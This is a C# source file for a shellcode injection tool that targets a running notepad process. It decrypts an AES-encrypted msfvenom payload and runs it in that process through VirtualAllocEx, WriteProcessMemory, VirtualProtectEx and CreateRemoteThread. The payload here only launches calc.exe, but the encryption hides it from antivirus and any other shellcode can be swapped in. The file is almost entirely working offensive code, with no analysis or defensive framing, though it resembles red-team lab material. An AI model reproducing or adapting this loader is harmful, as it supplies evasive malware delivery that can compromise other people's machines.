using System;
using System.IO;
using System.Text;
using System.Diagnostics;
using System.Security.Cryptography;
using System.Runtime.InteropServices;

namespace ClassicInject
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualProtectEx(IntPtr broadband, IntPtr bend, Int32 jackie, UInt32 yen, out UInt32 roster);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFreeEx(IntPtr p1, IntPtr p2, int p3, uint p4);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);

        // Memory permissions
        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 MEM_RESERVE = 0x2000;

        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        private static UInt32 PAGE_READWRITE = 0x04;
        private static UInt32 PAGE_EXECUTE_READ = 0x20;

        private const UInt32 FREE_DECOMMIT = 0x4000;
        private const UInt32 FREE_RELEASE = 0x8000;

        // Process privileges
        const int PROCESS_ALL_ACCESS = 0x001F0FFF;
        const int PROCESS_CREATE_THREAD = 0x0002;
        const int PROCESS_QUERY_INFORMATION = 0x0400;
        const int PROCESS_VM_OPERATION = 0x0008;
        const int PROCESS_VM_WRITE = 0x0020;
        const int PROCESS_VM_READ = 0x0010;

        //
        // Primary Injection Method
        //
        static int Inject(IntPtr pHandle, byte[] payload)
        {
            IntPtr memAddr = VirtualAllocEx(pHandle, IntPtr.Zero, (uint)payload.Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            Console.WriteLine("[+] Allocated memory at 0x{0}", memAddr);

            IntPtr bytesWritten = IntPtr.Zero;
            WriteProcessMemory(pHandle, memAddr, payload, payload.Length, out bytesWritten);
            Console.WriteLine("[+] Copied data into memory.");

            VirtualProtectEx(pHandle, memAddr, payload.Length, PAGE_EXECUTE_READ, out uint oldProtect);
            Console.WriteLine("[+] Modified memory protection to PAGE_EXECUTE_READ.");

            IntPtr hThread = CreateRemoteThread(pHandle, IntPtr.Zero, 0, (IntPtr)memAddr, IntPtr.Zero, 0, out IntPtr threadID);
            Console.WriteLine("[+] Executed code in remote process.");

            VirtualFreeEx(pHandle, memAddr, 0, FREE_DECOMMIT | FREE_RELEASE);

            CloseHandle(pHandle);

            if (hThread != null)
            {
                return 0;
            }
            return -1;
        }

        static IntPtr GetProcHandle(int PID)
        {
            return OpenProcess(PROCESS_ALL_ACCESS, false, PID);
        }

        //
        // Options for Shellcode decryption (AES & XOR)
        //
        private static byte[] DecryptXOR(byte[] data, string key)
        {
            byte[] buf = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
            {
                buf[i] = (byte)(data[i] ^ key[i % key.Length]);
            }
            return buf;
        }

        private static byte[] DecryptAES(byte[] data, byte[] key)
        {
            // ref: https://github.com/plackyhacker/Suspended-Thread-Injection/blob/main/injection.cs
            byte[]  tempKey = SHA256.Create().ComputeHash(key);
            Aes aes = new AesManaged();
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.None;
            ICryptoTransform dec = aes.CreateDecryptor(tempKey, GenIV());

            using (MemoryStream msDecrypt = new MemoryStream())
            {
                using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, dec, CryptoStreamMode.Write))
                {

                    csDecrypt.Write(data, 0, data.Length);

                    return msDecrypt.ToArray();
                }
            }
        }

        private static byte[] GenIV(int length = 16)
        {
            byte[] b = new byte[length];
            for (int i = 0; i < length; i++)
            {
                b[i] = 0x00;
            }
            return b;
        }

        //
        // Get process
        //
        static int GetProcByName(string processName)
        {
            foreach (var p in Process.GetProcesses())
            {
                try
                {
                    if (p.ProcessName == processName)
                    {
                        return p.Id;
                    }
                }
                catch
                {
                    continue;
                }
            }
            return -1;
        }

        // Entry
        static void Main(string[] args)
        {
            // msfvenom -p windows/x64/exec CMD='calc.exe' EXITFUNC=thread -f c -o calc.bin
            // python3 shellcrypt.py -f cs -e aes ../shellcode/calc.bin
            byte[] buf = new byte[288] { 0x91, 0x85, 0x66, 0xa, 0x48, 0x22, 0x50, 0xd3, 0x5c, 0x33, 0x1, 0x14, 0x78, 0x94, 0x51, 0x20, 0x26, 0x69, 0x34, 0xb4, 0xa0, 0x82, 0x1d, 0xaa, 0x23, 0x39, 0x4f, 0x53, 0x69, 0x83, 0xfb, 0xe9, 0x2e, 0xb9, 0xb9, 0x5b, 0xda, 0x97, 0x31, 0x2d, 0x3a, 0xf, 0xa4, 0xf5, 0xa8, 0xf0, 0x37, 0xc6, 0xfd, 0xac, 0x2e, 0x21, 0x4c, 0xe2, 0x6f, 0x1, 0x81, 0xf, 0x8f, 0x1d, 0x43, 0xe0, 0xbc, 0xce, 0xf2, 0xf2, 0xc8, 0x2d, 0xaf, 0xcb, 0x14, 0x8d, 0xc1, 0x92, 0xdc, 0x8, 0xcb, 0xa1, 0xc0, 0x17, 0x1c, 0x4, 0x11, 0x5c, 0x59, 0xaf, 0x31, 0xa7, 0x15, 0x34, 0x22, 0x90, 0x81, 0xc0, 0xff, 0x95, 0x47, 0xd3, 0xea, 0x83, 0x7a, 0x43, 0xe4, 0x37, 0xf5, 0x2e, 0x2f, 0xe7, 0xb3, 0x8b, 0x3c, 0x5a, 0xff, 0xa5, 0xcb, 0xb2, 0x28, 0x37, 0xe0, 0xf7, 0x32, 0xdf, 0x20, 0x57, 0xa0, 0x55, 0xa4, 0xc2, 0x29, 0x73, 0xce, 0x98, 0x1b, 0xe7, 0xda, 0xf, 0x6, 0x60, 0x78, 0x82, 0xbd, 0x5a, 0xd5, 0x30, 0x1c, 0x7d, 0xd5, 0xfd, 0x88, 0x80, 0xed, 0x70, 0x30, 0x31, 0xe9, 0x18, 0xa, 0xe3, 0x88, 0x58, 0x57, 0x50, 0x7a, 0x66, 0xa5, 0xd0, 0xef, 0x72, 0x6, 0x41, 0x93, 0xe0, 0xaa, 0x19, 0x66, 0xaa, 0xf8, 0x68, 0xe0, 0x6f, 0x77, 0xed, 0x54, 0xc, 0x85, 0x8a, 0xda, 0x87, 0xa8, 0xe4, 0xf8, 0xae, 0x12, 0xd8, 0x42, 0xe7, 0x58, 0x47, 0x81, 0xaf, 0x5e, 0x5e, 0xa4, 0xbf, 0xbf, 0xb0, 0xf, 0x6, 0xef, 0x99, 0xa4, 0xdf, 0xa8, 0x6, 0x7c, 0xbd, 0x75, 0x64, 0x2a, 0x2a, 0x9, 0x14, 0xee, 0x9e, 0x36, 0x9d, 0x40, 0x30, 0x66, 0x92, 0xe, 0x5e, 0x6a, 0x9d, 0xb7, 0x6a, 0xf5, 0x76, 0x1d, 0xcc, 0x96, 0x35, 0x52, 0x24, 0x25, 0x30, 0x86, 0xc6, 0xef, 0x4d, 0x9f, 0x30, 0x94, 0xe6, 0xb1, 0x8b, 0xe3, 0xdf, 0xe5, 0x44, 0x86, 0x66, 0x26, 0x99, 0xe0, 0x2e, 0xe4, 0xe7, 0x9a, 0x41, 0x78, 0x61, 0xe8, 0x60, 0x7c, 0xaa, 0xcd, 0x7b, 0x58, 0xd3, 0x89, 0x5a, 0x55, 0xd1, 0x95, 0x9c, 0xe7, 0x51 };
            byte[] key = new byte[16] { 0x83, 0x61, 0x42, 0x6d, 0x1a, 0x5d, 0x30, 0xeb, 0xe2, 0x80, 0x6f, 0x67, 0xb6, 0x4c, 0xf5, 0x3c };
            byte[] shellcode = DecryptAES(buf, key);
            Console.WriteLine("[+] Decrypted Shellcode ({0} bytes)", shellcode.Length);

            // Open Proc Handle
            int pid = GetProcByName("notepad");
            UIntPtr handle = UIntPtr.Zero;
            IntPtr pHandle = GetProcHandle(pid);
            Console.WriteLine("[+] Opened process handle (Process: {0} | PID: {1})", Process.GetProcessById(pid).ProcessName, pid);

            // Inject Shellcode
            Inject(pHandle, shellcode);

            // Pause before exit
            Console.WriteLine("\n[*] Injection complete, press <Enter> to exit");
            Console.ReadLine();
        }
    }
}
